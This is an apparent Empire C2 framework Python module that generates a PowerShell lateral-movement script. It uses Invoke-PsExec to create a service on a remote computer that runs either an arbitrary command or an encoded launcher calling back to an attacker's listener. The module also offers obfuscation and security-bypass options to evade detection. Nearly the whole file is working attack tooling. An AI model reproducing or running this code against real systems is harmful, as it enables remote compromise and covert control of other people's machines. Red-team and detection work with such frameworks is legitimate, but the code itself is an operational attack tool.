from __future__ import print_function

from builtins import str
from builtins import object

from empire.server.utils import data_util
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # Set booleans to false by default
        obfuscate = False

        listener_name = params['Listener']
        computer_name = params['ComputerName']
        service_name = params['ServiceName']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        command = params['Command']
        result_file = params['ResultFile']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/lateral_movement/Invoke-PsExec.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code

        script_end = ""
        if command != "":
            # executing a custom command on the remote machine
            customCmd = '%COMSPEC% /C start /b ' + command.replace('"','\\"')
            script_end += "Invoke-PsExec -ComputerName %s -ServiceName \"%s\" -Command \"%s\"" % (computer_name, service_name, customCmd)
            
            if result_file != "":
                # Store the result in a file
                script_end += " -ResultFile \"%s\"" % (result_file)

        else:

            if not main_menu.listeners.is_listener_valid(listener_name):
                # not a valid listener, return nothing for the script
                print(helpers.color("[!] Invalid listener: " + listener_name))
                return ""

            else:

                # generate the PowerShell one-liner with all of the proper options set
                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                               userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                               bypasses=params['Bypasses'])

                if launcher == "":
                    print(helpers.color("[!] Error in launcher generation."))
                    return ""
                else:

                    stager_cmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
                    script_end += "Invoke-PsExec -ComputerName %s -ServiceName \"%s\" -Command \"%s\"" % (computer_name, service_name, stager_cmd)


        script_end += "| Out-String | %{$_ + \"`n\"};"

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
